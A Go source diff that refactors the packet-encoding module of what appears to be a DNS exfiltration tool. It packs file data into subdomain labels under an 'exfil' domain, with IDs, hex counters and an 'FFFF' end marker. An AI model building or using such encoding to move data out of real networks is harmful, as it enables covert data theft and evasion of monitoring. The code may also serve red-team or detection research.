@@ -4,6 +4,7 @@ import (
 	"crypto/rand"
 	"encoding/hex"
 	"fmt"
+	"sneakygolem/internal/logger"
 	"strconv"
 )
 
@@ -20,65 +21,67 @@ func pow(a, b int) int {
 }
 
 type Settings struct {
-	id_len      int
-	counter_len int
-	domain      string
-	domain_len  int
+	IDLen      int
+	CounterLen int
+	Domain     string
+	DomainLen  int
+	MaxCount   int
 }
 
 func (s Settings) PayloadLength() int {
-	return 255 - s.id_len - s.counter_len - s.domain_len
+	return 63 - s.IDLen - s.CounterLen - s.DomainLen
 }
 
 var GlobalSettings = Settings{}
 
 func init() {
-	GlobalSettings.id_len = 16
-	GlobalSettings.counter_len = 4
-	GlobalSettings.domain = ".jacobseunglee.com"
-	GlobalSettings.domain_len = len(GlobalSettings.domain)
+	GlobalSettings.IDLen = 16
+	GlobalSettings.CounterLen = 4
+	GlobalSettings.Domain = ".exfil.jacobseunglee.com"
+	GlobalSettings.DomainLen = len(GlobalSettings.Domain)
+	GlobalSettings.MaxCount = pow(16, GlobalSettings.CounterLen)
+	logger.Init()
 }
 
 func CalculateMaxFileSize() int {
-	return (255 - GlobalSettings.PayloadLength()) * pow(16, GlobalSettings.counter_len)
+	return (63 - GlobalSettings.PayloadLength()) * GlobalSettings.MaxCount
 }
 
 func EncodePayload(id string, counter int, payload string) (string, error) {
-	count := fmt.Sprintf("%0*x", GlobalSettings.counter_len, counter)
+	count := fmt.Sprintf("%0*x", GlobalSettings.CounterLen, counter)
 
-	return id + count + payload + GlobalSettings.domain, nil
+	return id + count + payload + GlobalSettings.Domain, nil
 }
 
-type packet struct {
-	id      string
-	counter int
-	payload string
+type Packet struct {
+	ID      string
+	Counter int
+	Payload string
 }
 
-func DecodePayload(payload string) (packet, error) {
-	id := payload[:GlobalSettings.id_len]
-	count := payload[GlobalSettings.id_len : GlobalSettings.id_len+GlobalSettings.counter_len]
-	enc_payload := payload[GlobalSettings.id_len+GlobalSettings.counter_len:]
-
-	dec_bytes, err := hex.DecodeString(enc_payload)
-	if err != nil {
-		return packet{}, err
-	}
+func DecodePayload(payload string) (Packet, error) {
+	id := payload[:GlobalSettings.IDLen]
+	count := payload[GlobalSettings.IDLen : GlobalSettings.IDLen+GlobalSettings.CounterLen]
+	enc_payload := payload[GlobalSettings.IDLen+GlobalSettings.CounterLen:]
 
 	counter, err := strconv.ParseInt(count, 16, 64)
 	if err != nil {
-		return packet{}, err
+		return Packet{}, err
 	}
 
-	return packet{
-		id:      id,
-		counter: int(counter),
-		payload: string(dec_bytes),
+	return Packet{
+		ID:      id,
+		Counter: int(counter),
+		Payload: enc_payload,
 	}, nil
 }
 
+func FinalizePayload(id string) string {
+	return id + "FFFF" + GlobalSettings.Domain
+}
+
 func CreateId() (string, error) {
-	bytes := make([]byte, GlobalSettings.id_len/2)
+	bytes := make([]byte, GlobalSettings.IDLen/2)
 	if _, err := rand.Read(bytes); err != nil {
 		return "", err
 	}
